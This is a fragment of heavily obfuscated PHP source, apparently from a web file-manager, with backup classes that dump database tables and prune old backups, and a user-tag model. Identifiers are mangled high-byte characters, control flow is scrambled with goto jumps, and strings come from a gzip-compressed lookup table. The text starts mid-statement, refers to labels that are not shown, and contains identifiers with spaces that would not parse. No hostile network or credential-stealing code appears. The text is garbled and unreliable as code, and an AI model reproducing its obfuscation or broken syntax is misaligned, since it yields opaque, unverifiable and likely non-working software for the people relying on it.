(isset($cî¶÷„”É‹[$B—ê‰·­…™[292]][$B—ê‰·­…™[179]][$B—ê‰·­…™[430]])) { $f¤¦îõ´å¼ = (int) $cî¶÷„”É‹[$B—ê‰·­…™[292]][$B—ê‰·­…™[179]][$B—ê‰·­…™[430]]; } if ($cî¶÷„”É‹[$B—ê‰·­…™[38]] == self::$name) { Model($B—ê‰·­…™[683])->remove($cî¶÷„”É‹[$B—ê‰·­…™[378]]); } $cî¶÷„”É‹ = $this->initData($f¤¦îõ´å¼, $cî¶÷„”É‹[$B—ê‰·­…™[686]]); } else { $this->checkStore($cî¶÷„”É‹[$B—ê‰·­…™[686]]); } } self::$option = $cî¶÷„”É‹; } private function initData($BÏÃÜ‚¥·ò = 0, $cè¶Ù²—•¹ = '') { goto F‘šÂé¯‡; DŒš—Ø²—: $Bí¾¬ù˜ù[$e«¼­‡ˆî[378]] = $AˆÈ©¿ê‘Ó; return $Bí¾¬ù˜ù; goto f¸ÇØ˜© Å; aäÃë©à: $this->checkStore($e·ÎÈ™œñª[$e«¼­‡ˆî[686]]); $Bí¾¬ù˜ù = array($e«¼­‡ˆî[686] => $e·ÎÈ™œñª[$e«¼­‡ˆî[686]], $e«¼­‡ˆî[38] => self::$name, $e«¼­‡ˆî[684] => 0, $e«¼­‡ˆî[687] => $e·ÎÈ™œñª[$e«¼­‡ˆî[687]], $e«¼­‡ˆî[292] => array($e«¼­‡ˆî[688] => array($e«¼­‡ˆî[684] => 0), $e«¼­‡ˆî[689] => array($e«¼­‡ˆî[684] => 0, $e«¼­‡ˆî[690] => 0, $e«¼­‡ˆî[691] => 0, $e«¼­‡ˆî[39] => $e«¼­‡ˆî[43]), $e«¼­‡ˆî[692] => array($e«¼­‡ˆî[684] => 0, $e«¼­‡ˆî[690] => 0, $e«¼­‡ˆî[691] => 0), $e«¼­‡ˆî[179] => array($e«¼­‡ˆî[684] => 0, $e«¼­‡ˆî[693] => 0, $e«¼­‡ˆî[694] => 0, $e«¼­‡ˆî[695] => 0, $e«¼­‡ˆî[696] => 0, $e«¼­‡ˆî[430] => $BÏÃÜ‚¥·ò)), $e«¼­‡ˆî[697] => time(), $e«¼­‡ˆî[460] => 0); $AˆÈ©¿ê‘Ó = Model($e«¼­‡ˆî[683])->insert($Bí¾¬ù˜ù); goto DŒš—Ø²—; F‘šÂé¯‡: $e«¼­‡ˆî =& $_SERVER[¹÷ˆ§éÒ°ú]; $e·ÎÈ™œñª = Model($e«¼­‡ˆî[683])->config(); if ($cè¶Ù²—•¹ && $e·ÎÈ™œñª[$e«¼­‡ˆî[686]] != $cè¶Ù²—•¹) { $BÏÃÜ‚¥·ò = 0; } goto aäÃë©à; f¸ÇØ˜© Å: } private function checkStore($AóÁÑ·ñ™) { $DºËè·ª² =& $_SERVER[¹÷ˆ§éÒ°ú]; $BóåáøùƒÊ = Model($DºËè·ª²[698])->listData($AóÁÑ·ñ™); Model($DºËè·ª²[698])->checkConfig($BóåáøùƒÊ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¹÷ˆ§éÒ°ú][683])->findByName(self::$name); } return self::$option; } public static function set($F¤åÂŠóÚ) { $f¦Áï¯ˆé¹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FĞ¤ÛêÇ ’ = self::get(); foreach ($F¤åÂŠóÚ as $Dˆ¨ÊÈ° => $döìĞ“²¯§) { $CƒÂ©óçÃ½ = explode($f¦Áï¯ˆé¹[103], $Dˆ¨ÊÈ°); $cİ”×‹õªä = count($CƒÂ©óçÃ½); switch ($cİ”×‹õªä) { case 1: $FĞ¤ÛêÇ ’[$CƒÂ©óçÃ½[0]] = $döìĞ“²¯§; break; case 2: $FĞ¤ÛêÇ ’[$CƒÂ©óçÃ½[0]][$CƒÂ©óçÃ½[1]] = $döìĞ“²¯§; break; case 3: $FĞ¤ÛêÇ ’[$CƒÂ©óçÃ½[0]][$CƒÂ©óçÃ½[1]][$CƒÂ©óçÃ½[2]] = $döìĞ“²¯§; break; } } Model($f¦Áï¯ˆé¹[683])->update($FĞ¤ÛêÇ ’[$f¦Áï¯ˆé¹[378]], $FĞ¤ÛêÇ ’); self::$option = $FĞ¤ÛêÇ ’; return self::$option; } public function keep() { $d³Í¯—¾ƒ© =& $_SERVER[¹÷ˆ§éÒ°ú]; $E÷Ê¤é»— = self::get(); if ($E÷Ê¤é»—[$d³Í¯—¾ƒ©[292]][$d³Í¯—¾ƒ©[688]][$d³Í¯—¾ƒ©[684]] == $d³Í¯—¾ƒ©[95]) { return; } $this->backupKeep($E÷Ê¤é»—); self::set(array($d³Í¯—¾ƒ©[699] => 1)); } private function backupKeep($aÀè·¢ôÂÑ) { goto A£–ù‰¾î’; e‡¬ˆ•â¤»: for ($cÎâÌîóÁ® = 0; $cÎâÌîóÁ® < 12; $cÎâÌîóÁ®++) { $Cˆ‘·’ó«á[] = date($FŞµ—¿ãÁ[700], strtotime("\x2d{$cÎâÌîóÁ®}\x20\x6d\157\x6e\164\x68\x73")); } $Cˆ‘·’ó«á = array_unique($Cˆ‘·’ó«á); foreach ($b•Ù…àƒ‘ as $CÚîšĞÃ…) { if (!empty($CÚîšĞÃ…[$FŞµ—¿ãÁ[38]]) && in_array($CÚîšĞÃ…[$FŞµ—¿ãÁ[38]], $Cˆ‘·’ó«á)) { continue; } Model($FŞµ—¿ãÁ[683])->remove($CÚîšĞÃ…[$FŞµ—¿ãÁ[378]]); $c´îğšó • = "\x7b\151\157\x3a{$aÀè·¢ôÂÑ[$FŞµ—¿ãÁ[686]]}\175\x2f\x64\141\164\x61\x62\141\x73\145\57\142\x61\x63\x6b\165\160\137{$CÚîšĞÃ…[$FŞµ—¿ãÁ[38]]}"; IO::remove($c´îğšó •, !1); } goto FšêØÏëƒ; A£–ù‰¾î’: $FŞµ—¿ãÁ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b•Ù…àƒ‘ = Model($FŞµ—¿ãÁ[683])->listData(); if (empty($b•Ù…àƒ‘)) { return; } goto e–ß•Ëïš; e–ß•Ëïš: $cÎâÌîóÁ® = 0; $Cˆ‘·’ó«á = array(); foreach ($b•Ù…àƒ‘ as $CÚîšĞÃ…) { if ($cÎâÌîóÁ® >= 7) { break; } $Cˆ‘·’ó«á[] = $CÚîšĞÃ…[$FŞµ—¿ãÁ[38]]; $cÎâÌîóÁ®++; } goto e‡¬ˆ•â¤»; FšêØÏëƒ: } public function db() { goto c­ÓçÌ™¨; c­ÓçÌ™¨: $Bƒ×¶ù’¼É =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cá“îœ¶ƒ = self::get(); if ($Cá“îœ¶ƒ[$Bƒ×¶ù’¼É[292]][$Bƒ×¶ù’¼É[689]][$Bƒ×¶ù’¼É[684]] == $Bƒ×¶ù’¼É[95]) { return !0; } goto eË´¦ÖéÙï; eË´¦ÖéÙï: $e™Œ‡íÑÄÓ = new BackupDb(); if (!$e™Œ‡íÑÄÓ->index()) { return !1; } self::set(array($Bƒ×¶ù’¼É[701] => 1)); goto B¦¥…œ¡¹; B¦¥…œ¡¹: return !0; goto Dìê†Ì«Øä; Dìê†Ì«Øä: } public function dbFile() { goto b©¦šÌÖÓ‰; b©¦šÌÖÓ‰: $eÉĞåç•ï =& $_SERVER[¹÷ˆ§éÒ°ú]; $CØñ®‚‰Ä¿ = self::get(); if ($CØñ®‚‰Ä¿[$eÉĞåç•ï[292]][$eÉĞåç•ï[692]][$eÉĞåç•ï[684]] == $eÉĞåç•ï[95]) { return !0; } goto eœ·È¿ãÖæ; e›ª¸è¾ö: return !0; goto eÚ²¨Ü‡õ©; eœ·È¿ãÖæ: $d Í±ÙĞâ‚ = new BackupDbFile(); if (!$d Í±ÙĞâ‚->index()) { return !1; } self::set(array($eÉĞåç•ï[702] => 1)); goto e›ª¸è¾ö; eÚ²¨Ü‡õ©: } public function file() { $cÈ”½ä¼×… =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÜææßÈŒÅ = self::get(); if ($dÜææßÈŒÅ[$cÈ”½ä¼×…[292]][$cÈ”½ä¼×…[179]][$cÈ”½ä¼×…[684]] == $cÈ”½ä¼×…[95]) { return !0; } if (!isset($dÜææßÈŒÅ[$cÈ”½ä¼×…[687]]) || $dÜææßÈŒÅ[$cÈ”½ä¼×…[687]] == $cÈ”½ä¼×…[481]) { $A®ñœâÂÙŞ = new BackupFile(); if (!$A®ñœâÂÙŞ->index()) { return !1; } } self::set(array($cÈ”½ä¼×…[703] => 1, $cÈ”½ä¼×…[684] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E½ôœõåé; aÏÚçŠà´®: $e‹ä“·á = array_diff($e‹ä“·á, array($FøôøÂ‹“ñ[705], $FøôøÂ‹“ñ[706])); foreach ($e‹ä“·á as $eŞ¡Åöé›î) { $c×Ë—„‡“« += $F”†›ó‹÷¥->model($eŞ¡Åöé›î)->count(); } $e«¯ìµğšª = new Task($FøôøÂ‹“ñ[707], $FøôøÂ‹“ñ[708], $c×Ë—„‡“«, LNG($FøôøÂ‹“ñ[709]) . $FøôøÂ‹“ñ[710] . LNG($FøôøÂ‹“ñ[711])); goto F®µãåº·°; E½ôœõåé: $FøôøÂ‹“ñ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aåá¯©Ì¤ = Backup::get(); self::$io = $aåá¯©Ì¤[$FøôøÂ‹“ñ[686]]; goto e÷íƒø§„; cÇ‰Ó¥Ğ‡: $F”†›ó‹÷¥ = new DbManage($D®¹Òãèæ, $A‚ ¾À¸°); $fåÀï•ãÑã = TEMP_FILES . $FøôøÂ‹“ñ[704] . self::$name . $FøôøÂ‹“ñ[18]; del_dir($fåÀï•ãÑã); goto C´²‰öèÓÕ; e÷íƒø§„: self::$name = $aåá¯©Ì¤[$FøôøÂ‹“ñ[38]]; $D®¹Òãèæ = $GLOBALS[$FøôøÂ‹“ñ[16]][$FøôøÂ‹“ñ[27]]; $A‚ ¾À¸° = $this->_dbType($D®¹Òãèæ); goto cÇ‰Ó¥Ğ‡; aëõí¥»º¨: Backup::set($BÕº‹Ì•øÏ); return !0; goto d¢‹ÏÑ³±œ; C´²‰öèÓÕ: mk_dir($fåÀï•ãÑã); $c×Ë—„‡“« = $BĞ¢‚ïÍâÂ = 0; $e‹ä“·á = $F”†›ó‹÷¥->db()->getTables(); goto aÏÚçŠà´®; F®µãåº·°: foreach ($e‹ä“·á as $eŞ¡Åöé›î) { $Aò¸—×Êó¶ = $fåÀï•ãÑã . $eŞ¡Åöé›î . $FøôøÂ‹“ñ[712]; $EİâöÄëÎ„ = null; if ($eŞ¡Åöé›î == $FøôøÂ‹“ñ[713] && (!isset($aåá¯©Ì¤[$FøôøÂ‹“ñ[687]]) || $aåá¯©Ì¤[$FøôøÂ‹“ñ[687]] == $FøôøÂ‹“ñ[481])) { $EİâöÄëÎ„ = self::$io; } $BĞ¢‚ïÍâÂ += $F”†›ó‹÷¥->sqlFromDb($eŞ¡Åöé›î, $Aò¸—×Êó¶, $e«¯ìµğšª, $EİâöÄëÎ„); } $e«¯ìµğšª->end(); $BÕº‹Ì•øÏ = array($FøôøÂ‹“ñ[714] => $A‚ ¾À¸°, $FøôøÂ‹“ñ[701] => 1, $FøôøÂ‹“ñ[715] => $BĞ¢‚ïÍâÂ, $FøôøÂ‹“ñ[716] => $BĞ¢‚ïÍâÂ); goto aëõí¥»º¨; d¢‹ÏÑ³±œ: } private function _dbType($Cã‹ª—ŸÍ†) { goto E‚±÷Ãã; Aà·ë½÷Õ¡: return $cÕßÑô¸˜; goto BÈ¼Ôæ Æ; e±áœ¢Ğ³Õ: if ($cÕßÑô¸˜ == $AÁƒ‰…¶›­[718]) { $FİÍÛÈæÕ = explode($AÁƒ‰…¶›­[14], $Cã‹ª—ŸÍ†[$AÁƒ‰…¶›­[719]]); $cÕßÑô¸˜ = $FİÍÛÈæÕ[0]; } $B¸ĞÌ„Üˆè = array($AÁƒ‰…¶›­[720] => $AÁƒ‰…¶›­[19], $AÁƒ‰…¶›­[721] => $AÁƒ‰…¶›­[722]); if (isset($B¸ĞÌ„Üˆè[$cÕßÑô¸˜])) { $cÕßÑô¸˜ = $B¸ĞÌ„Üˆè[$cÕßÑô¸˜]; } goto Aà·ë½÷Õ¡; E‚±÷Ãã: $AÁƒ‰…¶›­ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cã‹ª—ŸÍ† = array_change_key_case($Cã‹ª—ŸÍ†); $cÕßÑô¸˜ = $Cã‹ª—ŸÍ†[$AÁƒ‰…¶›­[717]]; goto e±áœ¢Ğ³Õ; BÈ¼Ôæ Æ: } } goto A“ï÷²×Ô; d©¨àµÍÖ‰: $_SERVER[ÌœÆÒÍÚÇ²] = explode($_SERVER[¹÷ˆ§éÒ°ú][562], gzinflate(substr($_SERVER[¹÷ˆ§éÒ°ú][563], 10, -8))); $EÓ”‰¤’™‚ = $_SERVER[¹÷ˆ§éÒ°ú][564]; if (!$EÓ”‰¤’™‚) { die; } goto eÕó™·¸ì›; B¯ÖïíÚ´: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($cø‚ì‡Î¤») { $aãÌŞá†‰Ï =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($aãÌŞá†‰Ï[2194] => array(USER_ID, $aãÌŞá†‰Ï[2195])); } protected function listData() { $F‰Œ°È¼Á× =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÏÎÅãİ¤‹ = array($F‰Œ°È¼Á×[1418] => USER_ID, $F‰Œ°È¼Á×[447] => array($F‰Œ°È¼Á×[2198], 0)); $B‰á•×¬å = $F‰Œ°È¼Á×[2200]; $BÌ‘ƒ¿½ÊØ = $this->field($B‰á•×¬å)->where($dÏÎÅãİ¤‹)->order($F‰Œ°È¼Á×[2201])->select(); return $BÌ‘ƒ¿½ÊØ ? $BÌ‘ƒ¿½ÊØ : array(); } protected function listByTag($Cã¸ò¢Œß) { } protected function addToTag($dºÑ…¤ª÷Ë, $E“©ùÙˆåÑ) { $bİ‘à¼„”µ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!Model($bİ‘à¼„”µ[2324])->listData($E“©ùÙˆåÑ) || !Model($bİ‘à¼„”µ[747])->pathInfo($dºÑ…¤ª÷Ë)) { return !1; } $d¶šµ…Ú¹á = array($bİ‘à¼„”µ[1418] => USER_ID, $bİ‘à¼„”µ[447] => $E“©ùÙˆåÑ, $bİ‘à¼„”µ[398] => $dºÑ…¤ª÷Ë, $bİ‘à¼„”µ[399] => $bİ‘à¼„”µ[393], $bİ‘à¼„”µ[397] => $bİ‘à¼„”µ[43], $bİ‘à¼„”µ[2102] => 0); if ($this->where($d¶šµ…Ú¹á)->find()) { return !1; } return $this->add($d¶šµ…Ú¹á); } protected function removeFromTag($A”ƒ¹–µÓ, $aÚ†¡…ËÅ) { $C‰Õªˆ¡¨É =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!Model($C‰Õªˆ¡¨É[2324])->listData($aÚ†¡…ËÅ)) { return !1; } if (is_array($A”ƒ¹–µÓ)) { $A”ƒ¹–µÓ = array($C‰Õªˆ¡¨É[17], $A”ƒ¹–µÓ); } $a°àì‚ÄŒ“ = array($C‰Õªˆ¡¨É[1418] => USER_ID, $C‰Õªˆ¡¨É[447] => $aÚ†¡…ËÅ, $C‰Õªˆ¡¨É[399] => $C‰Õªˆ¡¨É[393], $C‰Õªˆ¡¨É[398] => $A”ƒ¹–µÓ); return $this->where($a°àì‚ÄŒ“)->delete(); } protected function removeByTag($dßÈó¥ šø) { $b¥²‰èÌù =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$dßÈó¥ šø) { return !1; } $DŠÒ¥¯®àª = array($b¥²‰èÌù[1418] => USER_ID, $b¥²‰èÌù[447] => $dßÈó¥ šø); return $this->where($DŠÒ¥¯®àª)->delete(); } protected function removeBySource($eâÃ¯¹—Ñ) { $DÑ†İˆä¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_array($eâÃ¯¹—Ñ)) { $eâÃ¯¹—Ñ = array($DÑ†İˆä¯[17], $eâÃ¯¹—Ñ); } $dä­…ÔÔÓ = array($DÑ†İˆä¯[1418] => USER_ID, $DÑ†İˆä¯[398] => $eâÃ¯¹—Ñ, $DÑ†İˆä¯[447] => array($DÑ†İˆä¯[918], 0)); return $this->where($dä­…ÔÔÓ)->delete(); } }